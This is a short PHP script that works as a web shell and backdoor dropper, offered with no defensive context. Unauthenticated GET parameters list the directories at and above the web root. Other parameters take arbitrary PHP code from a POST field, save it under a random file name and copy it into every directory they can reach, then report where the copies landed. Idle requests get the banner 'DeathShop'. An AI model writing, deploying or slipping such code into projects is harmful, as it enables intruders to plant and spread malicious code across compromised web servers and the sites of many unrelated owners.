<?php

function generateRandomString($length) {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $charLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charLength - 1)];
    }
    return $randomString;
}

function method1() {
    $currentPath = dirname($_SERVER['DOCUMENT_ROOT']);

    if ($currentPath === false) {
        echo "Unable to determine the current path.";
        return;
    }

    $contents = scandir($currentPath);

    if ($contents === false) {
        echo "Unable to list the contents of the current path.";
        return;
    }
    echo json_encode($contents);
}

function method2() {
    $currentPath = $_SERVER['DOCUMENT_ROOT'];

    if ($currentPath === false) {
        echo "Unable to determine the current path.";
        return;
    }

    $contents = scandir($currentPath);

    if ($contents === false) {
        echo "Unable to list the contents of the current path.";
        return;
    }
    echo json_encode($contents);
}

if (isset($_GET['met1'])) {
    method1();
} else if (isset($_GET['met2'])) {
    method2();
} else if (isset($_GET['actmet1'])) {
    $sc = $_POST['file'];
    $nama = generateRandomString(8);
    $filePath = $nama . '.php';
    
    $dead = fopen($filePath, "w");
    if ($dead === false) {
        echo "Failed to open the file for writing.";
    } else {
    
        if (fwrite($dead, $sc) === false) {
            echo "Failed to write to the file.";
        } else {
            fclose($dead);
            $currentPath = dirname($_SERVER['DOCUMENT_ROOT']);
            $contents = scandir($currentPath);
            foreach ($contents as $a) {
                $newpath = $currentPath . '/' . $a . '/' . $nama . '.php';
                $badman = @copy($filePath, $newpath);
                if ($badman) {
                    echo $a . '/' . $nama . '.php' . '|';
                }
            }
        }
    }
} else if (isset($_GET['actmet2'])) {
    $sc = $_POST['file'];
    $nama = generateRandomString(8);
    $filePath = $nama . '.php';
    
    $dead = fopen($filePath, "w");
    if ($dead === false) {
        echo "Failed to open the file for writing.";
    } else {
    
        if (fwrite($dead, $sc) === false) {
            echo "Failed to write to the file.";
        } else {
            fclose($dead);
            $currentPath = $_SERVER['DOCUMENT_ROOT'];
            $contents = scandir($currentPath);
            foreach ($contents as $a) {
                $newpath = $currentPath . '/' . $a . '/' . $nama . '.php';
                $badman = @copy($filePath, $newpath);
                if ($badman) {
                    echo $a . '/' . $nama . '.php' . '|';
                }
            }
        }
    }
} else {
    echo 'DeathShop';
}
?>